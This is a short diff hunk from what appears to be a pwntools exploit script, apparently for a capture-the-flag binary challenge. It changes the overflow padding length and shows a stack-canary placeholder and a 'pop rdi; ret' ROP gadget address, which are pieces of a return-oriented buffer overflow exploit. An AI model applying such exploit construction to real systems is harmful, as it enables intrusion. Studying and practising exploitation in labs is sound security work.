@@ -23,7 +23,7 @@ print(hex(corefile.fault_addr))
 
 firstPadding = cyclic(32)
 cannary = b'ABCD'
-secondPadding = cyclic(20)
+secondPadding = cyclic(lenUntilRIP)
 
 popRdi = p64(0x401288) # pop rdi ; ret
 
